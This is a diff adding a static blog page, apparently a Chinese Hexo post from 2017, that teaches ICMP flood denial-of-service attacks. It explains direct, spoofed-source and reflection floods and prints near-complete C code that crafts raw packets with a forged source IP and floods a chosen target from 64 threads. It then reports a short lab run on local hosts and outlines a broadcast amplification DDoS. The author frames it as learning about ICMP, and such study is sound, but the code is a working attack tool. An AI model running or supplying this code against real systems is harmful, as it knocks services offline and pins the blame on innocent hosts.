@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+    <head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <meta name="robots" content="index, follow">
+  <!-- title -->
+  
+    
+  <title>ICMP洪水攻击 - Hexo</title>
+    
+  
+  
+  <!-- open graph -->
+  <meta name="description" content="ICMP协议实现了PING的程序，ICMP除了实现这么一个PING程序，还有哪些不为人知或者好玩的用途？这里我将介绍ICMP另一个很有名的黑科技：ICMP洪水攻击。 ICMP洪水攻击属于大名鼎鼎的DOS（Denial of Service）攻击的一种，一种是黑客们喜欢的攻击手段，这里本着加深自己对ICMP的理解的目的，也试着基于ICMP写一段ICMP的洪水攻击小程序。 洪水攻击（FLOOD ATT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ICMP洪水攻击">
+<meta property="og:url" content="http://example.com/2017/02/14/ICMP%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="ICMP协议实现了PING的程序，ICMP除了实现这么一个PING程序，还有哪些不为人知或者好玩的用途？这里我将介绍ICMP另一个很有名的黑科技：ICMP洪水攻击。 ICMP洪水攻击属于大名鼎鼎的DOS（Denial of Service）攻击的一种，一种是黑客们喜欢的攻击手段，这里本着加深自己对ICMP的理解的目的，也试着基于ICMP写一段ICMP的洪水攻击小程序。 洪水攻击（FLOOD ATT">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2017/02/14/ICMP%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1093303-20170213235415910-2043263573.png">
+<meta property="og:image" content="http://example.com/2017/02/14/ICMP%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1093303-20170213235841910-1275984405.png">
+<meta property="og:image" content="http://example.com/2017/02/14/ICMP%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1093303-20170214000442425-1603699988.png">
+<meta property="og:image" content="http://example.com/2017/02/14/ICMP%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1093303-20170214000518847-108927127.png">
+<meta property="og:image" content="http://example.com/2017/02/14/ICMP%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1093303-20170214000552175-594982086.png">
+<meta property="article:published_time" content="2017-02-14T10:33:27.000Z">
+<meta property="article:modified_time" content="2024-11-29T07:44:44.299Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="网络协议">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2017/02/14/ICMP%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1093303-20170213235415910-2043263573.png">
+  <!-- canonical -->
+  
+  <link rel="canonical" href="http://example.com/2017/02/14/ICMP洪水攻击/">
+  
+  <!-- Favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+  <link rel="apple-touch-icon" sizes="180x180" href="/img/apple-touch-icon.png">
+  <!-- CSS -->
+  
+<link rel="stylesheet" href="/css/reset.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/markdown.css">
+
+  
+<link rel="stylesheet" href="/css/fonts.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+    <body>
+        <div class="paper">
+            <div class="paper-main">
+                
+                    <div class="post-header">
+    <a class="logo" href="/">Hexo</a>
+    <!-- <div class="logo"><a href="/" title="Len"><img src="/img/logo.svg" alt="Len" aria-label="logo" height="20"></a></div> -->
+        <ul class="nav">
+            
+            <li><a href="/">Home</a></li>
+            
+            <li><a href="/about">About</a></li>
+            
+            <li><a href="/archives">Archives</a></li>
+            
+        </ul>
+
+
+    </a>
+</div>
+
+                
+                <div class="post-main">
+    
+        <div class="post-main-title">
+            ICMP洪水攻击
+        </div>
+        <div class="post-meta">
+            2017-02-14 ｜ 
+            
+                <a href="/categories/%E6%8A%80%E6%9C%AF/"># 技术</a>
+            
+        </div>
+        <!-- 圆角分类 -->
+        <!-- <div class="tags"> -->
+            <!--  -->
+                <!-- <a href="/categories/%E6%8A%80%E6%9C%AF/">技术</a> -->
+            <!--  -->
+        <!-- </div> -->
+        <div class="post-md">
+            <p>ICMP协议实现了PING的程序，ICMP除了实现这么一个PING程序，还有哪些不为人知或者好玩的用途？这里我将介绍ICMP另一个很有名的黑科技：ICMP洪水攻击。</p>
+<p>ICMP洪水攻击属于大名鼎鼎的DOS（Denial of Service）攻击的一种，一种是黑客们喜欢的攻击手段，这里本着加深自己对ICMP的理解的目的，也试着基于ICMP写一段ICMP的洪水攻击小程序。</p>
+<p>洪水攻击（FLOOD ATTACK）指的是利用计算机网络技术向目的主机发送大量无用数据报文，使得目的主机忙于处理无用的数据报文而无法提供正常服务的网络行为。<br>ICMP洪水攻击：顾名思义，就是对目的主机发送洪水般的ping包，使得目的主机忙于处理ping包而无能力处理其他正常请求，这就好像是洪水一般的ping包把目的主机给淹没了。</p>
+<p>要实现ICMP的洪水攻击，需要以下三项的知识储备：</p>
+<ol>
+<li>DOS攻击原理</li>
+<li>ICMP的深入理解</li>
+<li>原始套接字的编程技巧</li>
+</ol>
+<h2 id="一、ICMP洪水攻击原理"><a href="#一、ICMP洪水攻击原理" class="headerlink" title="一、ICMP洪水攻击原理"></a>一、ICMP洪水攻击原理</h2><p>ICMP洪水攻击是在ping的基础上形成的，但是ping程序很少能造成目的及宕机的问题，这是因为ping的发送包的速率太慢了，像我实现的PING程序里ping包发送速率限定在1秒1发，这个速率目的主机处理ping包还是绰绰有余的。所以要造成“洪水”的现象，就必须提升发包速率。这里介绍三种ICMP洪水攻击的方式：</p>
+<p>（1）直接洪水攻击<br>这样做需要本地主机的带宽和目的主机的带宽之间进行比拼，比如我的主机网络带宽是30M的，而你的主机网络带宽仅为3M，那我发起洪水攻击淹没你的主机成功率就很大了。这种攻击方式要求攻击主机处理能力和带宽要大于被攻击主机，否则自身被DoS了。基于这种思想，我们可以使用一台高带宽高性能的电脑，采用多线程的方法一次性发送多个ICMP请求报文，让目的主机忙于处理大量这些报文而造成速度缓慢甚至宕机。这个方法有个大缺点，就是对方可以根据ICMP包的IP地址而屏蔽掉攻击源，使得攻击不能继续。</p>
+<p>（2）伪IP攻击<br>在直接洪水攻击的基础上，我们将发送方的IP地址伪装成其他IP，如果是伪装成一个随机的IP，那就可以很好地隐藏自己的位置；如果将自己的IP伪装成其他受害者的IP，就会造成“挑拨离间”的情形，受害主机1的icmp回复包也如洪水般发送给受害主机2，如果主机1的管理员要查是哪个混蛋发包攻击自己，他一查ICMP包的源地址，咦原来是主机2，这样子主机2就成了戴罪羔羊了。</p>
+<p>（3）反射攻击<br>这类攻击的思想不同于上面两种攻击，反射攻击的设计更为巧妙。其实这里的方式三的攻击模式是前两个模式的合并版以及升级版，方式三的攻击策略有点像“借刀杀人“，反射攻击不再直接对目标主机，而是让其他一群主机误以为目标主机在向他们发送ICMP请求包，然后一群主机向目的主机发送ICMP应答包，造成来自四面八方的洪水淹没目的主机的现象。比如我们向局域网的其他主机发送ICMP请求包，然后自己的IP地址伪装成目的主机的IP，这样子目的主机就成了ICMP回显的焦点了。这种攻击非常隐蔽，因为受害主机很难查出攻击源是谁。</p>
+<p><img src="/2017/02/14/ICMP%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1093303-20170213235415910-2043263573.png"></p>
+<h2 id="二、ICMP洪水攻击程序设计"><a href="#二、ICMP洪水攻击程序设计" class="headerlink" title="二、ICMP洪水攻击程序设计"></a>二、ICMP洪水攻击程序设计</h2><p>这里我想实现一个ICMP洪水攻击的例子，这里我想采用方式二来进行设计。虽说方式三的“借刀杀人”更为巧妙，其实也是由方式二的伪装方式进一步延伸的，实现起来也是大同小异。</p>
+<p>首先给出攻击的模型图：</p>
+<p><img src="/2017/02/14/ICMP%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1093303-20170213235841910-1275984405.png"></p>
+<h3 id="1-组ICMP包"><a href="#1-组ICMP包" class="headerlink" title="1.组ICMP包"></a>1.组ICMP包</h3><p>这里的组包跟编写PING程序时的组包没太大差别，唯一需要注意的是，我们需要填写IP头部分，因为我们要伪装源地址，做到嫁祸于人。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">void DoS_icmp_pack(char* packet)</span><br><span class="line">&#123;</span><br><span class="line">    struct ip* ip_hdr &#x3D; (struct ip*)packet;</span><br><span class="line">    struct icmp* icmp_hdr &#x3D; (struct icmp*)(packet + sizeof(struct ip));</span><br><span class="line"></span><br><span class="line">    ip_hdr-&gt;ip_v &#x3D; 4;</span><br><span class="line">    ip_hdr-&gt;ip_hl &#x3D; 5;</span><br><span class="line">    ip_hdr-&gt;ip_tos &#x3D; 0;</span><br><span class="line">    ip_hdr-&gt;ip_len &#x3D; htons(ICMP_PACKET_SIZE);</span><br><span class="line">    ip_hdr-&gt;ip_id &#x3D; htons(getpid());</span><br><span class="line">    ip_hdr-&gt;ip_off &#x3D; 0;</span><br><span class="line">    ip_hdr-&gt;ip_ttl &#x3D; 64;</span><br><span class="line">    ip_hdr-&gt;ip_p &#x3D; PROTO_ICMP;</span><br><span class="line">    ip_hdr-&gt;ip_sum &#x3D; 0;</span><br><span class="line">    ip_hdr-&gt;ip_src.s_addr &#x3D; inet_addr(FAKE_IP);; &#x2F;&#x2F;伪装源地址</span><br><span class="line">    ip_hdr-&gt;ip_dst.s_addr &#x3D; dest;  &#x2F;&#x2F;填入要攻击的目的主机地址</span><br><span class="line"></span><br><span class="line">    icmp_hdr-&gt;icmp_type &#x3D; ICMP_ECHO;</span><br><span class="line">    icmp_hdr-&gt;icmp_code &#x3D; 0;</span><br><span class="line">    icmp_hdr-&gt;icmp_cksum &#x3D; htons(~(ICMP_ECHO &lt;&lt; 8));&#x2F;&#x2F;注意这里，因为数据部分为0，我们就简化了一下checksum的计算了</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="2-搭建发包线程"><a href="#2-搭建发包线程" class="headerlink" title="2.搭建发包线程"></a>2.搭建发包线程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">void Dos_Attack()</span><br><span class="line">&#123;</span><br><span class="line">    char* packet &#x3D; (char*)malloc(ICMP_PACKET_SIZE);</span><br><span class="line">    memset(packet, 0, ICMP_PACKET_SIZE);</span><br><span class="line">    struct sockaddr_in to;</span><br><span class="line">    DoS_icmp_pack(packet);</span><br><span class="line"></span><br><span class="line">    to.sin_family &#x3D; AF_INET;</span><br><span class="line">    to.sin_addr.s_addr &#x3D; dest;</span><br><span class="line">    to.sin_port &#x3D; htons(0);</span><br><span class="line"></span><br><span class="line">    while(alive)  &#x2F;&#x2F;控制发包的全局变量</span><br><span class="line">    &#123;</span><br><span class="line">        sendto(rawsock, packet, ICMP_PACKET_SIZE, 0, (struct sockaddr*)&amp;to, sizeof(struct sockaddr));        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    free(packet);  &#x2F;&#x2F;记得要释放内存</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-编写发包开关"><a href="#3-编写发包开关" class="headerlink" title="3.编写发包开关"></a>3.编写发包开关</h3><p>这里的开关很简单，用信号量+全局变量即可以实现。当我们按下ctrl+c时，攻击将关闭。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void Dos_Sig()</span><br><span class="line">&#123;</span><br><span class="line">    alive &#x3D; 0;</span><br><span class="line">    printf(&quot;stop DoS Attack!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-总的架构"><a href="#4-总的架构" class="headerlink" title="4.总的架构"></a>4.总的架构</h3><p>我们使用了64个线程一起发包，当然这个线程数还可以大大增加，来增加攻击强度。但我们只是做做实验，没必要搞那么大。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    struct hostent* host &#x3D; NULL;</span><br><span class="line">    struct protoent* protocol &#x3D; NULL;</span><br><span class="line">    int i;</span><br><span class="line">    alive &#x3D; 1;</span><br><span class="line">    pthread_t attack_thread[THREAD_MAX_NUM];  &#x2F;&#x2F;开64个线程同时发包    </span><br><span class="line">    int err &#x3D; 0;</span><br><span class="line"></span><br><span class="line">    if(argc &lt; 2)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Invalid input!\n&quot;);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    signal(SIGINT, Dos_Sig);</span><br><span class="line"></span><br><span class="line">    protocol &#x3D; getprotobyname(PROTO_NAME);</span><br><span class="line">    if(protocol &#x3D;&#x3D; NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Fail to getprotobyname!\n&quot;);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PROTO_ICMP &#x3D; protocol-&gt;p_proto;</span><br><span class="line"></span><br><span class="line">    dest &#x3D; inet_addr(argv[1]);</span><br><span class="line"></span><br><span class="line">    if(dest &#x3D;&#x3D; INADDR_NONE)</span><br><span class="line">    &#123;</span><br><span class="line">        host &#x3D; gethostbyname(argv[1]);</span><br><span class="line">        if(host &#x3D;&#x3D; NULL)</span><br><span class="line">        &#123;</span><br><span class="line">            printf(&quot;Invalid IP or Domain name!\n&quot;);</span><br><span class="line">            return -1;</span><br><span class="line">        &#125;</span><br><span class="line">        memcpy((char*)&amp;dest, host-&gt;h_addr, host-&gt;h_length);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    rawsock &#x3D; socket(AF_INET, SOCK_RAW, PROTO_ICMP);</span><br><span class="line">    if(rawsock &lt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Fait to create socket!\n&quot;);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setsockopt(rawsock, SOL_IP, IP_HDRINCL, &quot;1&quot;, sizeof(&quot;1&quot;));</span><br><span class="line"></span><br><span class="line">    printf(&quot;ICMP FLOOD ATTACK START\n&quot;);</span><br><span class="line"></span><br><span class="line">    for(i&#x3D;0;i&lt;THREAD_MAX_NUM;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        err &#x3D; pthread_create(&amp;(attack_thread[i]), NULL, (void*)Dos_Attack, NULL);</span><br><span class="line">        if(err)</span><br><span class="line">        &#123;</span><br><span class="line">            printf(&quot;Fail to create thread, err %d, thread id : %d\n&quot;,err, attack_thread[i]);            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(i&#x3D;0;i&lt;THREAD_MAX_NUM;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_join(attack_thread[i], NULL);   &#x2F;&#x2F;等待线程结束</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;ICMP ATTACK FINISHI!\n&quot;);</span><br><span class="line"></span><br><span class="line">    close(rawsock);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="三、实验"><a href="#三、实验" class="headerlink" title="三、实验"></a>三、实验</h2><p>本次实验本着学习的目的，想利用自己手上的设备，想进一步理解网络和协议的应用，所以攻击的幅度比较小，时间也就几秒，不对任何设备造成影响。</p>
+<p>再说一下我们的攻击步骤：我们使用主机172.0.5.183作为自己的攻击主机，并将自己伪装成主机172.0.5.182，对主机172.0.5.9发起ICMP洪水攻击。</p>
+<p>攻击开始</p>
+<p><img src="/2017/02/14/ICMP%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1093303-20170214000442425-1603699988.png"></p>
+<p>我们观察一下”受害者“那边的情况。在短短5秒里，正确收到并交付上层处理的包也高达7万多个了。我也不敢多搞事，避免影响机器工作。</p>
+<p><img src="/2017/02/14/ICMP%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1093303-20170214000518847-108927127.png"></p>
+<p>使用wireshark抓包再瞧一瞧，满满的ICMP包啊，看来量也是很大的。ICMP包的源地址显示为172.0.5.182（我们伪装的地址），它也把echo reply回给了172.0.5.182。主机172.0.5.182肯定会想，莫名其妙啊，怎么收到这么多echo reply包。</p>
+<p><img src="/2017/02/14/ICMP%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1093303-20170214000552175-594982086.png"></p>
+<p>攻击实验做完了。</p>
+<p>现在更为流行的是DDOS攻击，其威力更为强悍，策略更为精巧，防御难度也更加高。<br>其实，这种DDoS攻击也是在DOS的基础上发起的，具体步骤如下：</p>
+<ol>
+<li><p>攻击者向“放大网络”广播echo request报文</p>
+</li>
+<li><p>攻击者指定广播报文的源IP为被攻击主机</p>
+</li>
+<li><p>“放大网络”回复echo reply给被攻击主机</p>
+</li>
+<li><p>形成DDoS攻击场景</p>
+<p>这里的“放大网络”可以理解为具有很多主机的网络，这些主机的操作系统需要支持对目的地址为广播地址的某种ICMP请求数据包进行响应。</p>
+<p>攻击策略很精妙，简而言之，就是将源地址伪装成攻击主机的IP，然后发广播的给所有主机，主机们收到该echo request后集体向攻击主机回包，造成群起而攻之的情景。</p>
+</li>
+</ol>
+
+        </div>
+    
+<!-- tags -->
+
+    <div class="post-meta">
+        标签：
+        
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"> / 网络协议</a>
+        
+    </div>
+
+</div>
+                <div class="footer">
+    <span>Copyright © <script>document.write(new Date().getFullYear())</script> Hexo</span>
+    <span>Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> with <a target="_blank" rel="noopener" href="https:///imzl.com/zenmind">ZenMind</a></span>
+</div>
+
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+
+<script src="/js/highlight.min.js"></script>
+
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+            </div>
+        </div>
+    </body>
+</html>
